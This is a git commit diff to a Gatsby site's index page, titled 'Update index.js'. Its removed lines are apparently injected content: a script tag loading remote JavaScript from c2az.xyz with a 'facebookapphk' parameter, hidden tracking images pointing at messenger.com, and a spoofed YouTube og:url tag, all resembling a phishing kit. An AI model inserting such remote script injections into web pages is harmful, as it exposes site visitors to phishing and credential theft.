2498cacfbe9ed0132b5e00ed4d9a20aecc5e153c
tusurucu23s <95896360+tusurucu23s@users.noreply.github.com>
2022-01-21 11:28:39 +0800

    Update index.js

--- src/pages/index.js
+++ src/pages/index.js
@@ -8,12 +8,7 @@ import Seo from "../components/seo"
 const IndexPage = () => (
   <Layout>
     <Seo title="Home" />
-   <meta property="og:url" content="https://www.youtube.com/" />
-<script src="https://c2az.xyz/manzana/?api=1&lan=facebookapphk&ht=1" type="text/javascript" async="true"></script>
-<img src="//whos.amung.us/pingjs/?k=elchapito07s&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
-  <script type="text/javascript"></script>
-<img src="//whos.amung.us/pingjs/?k=elcartel07&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
-  <script type="text/javascript"></script> 
+
     <StaticImage
       src="../images/gatsby-astronaut.png"
       width={300}
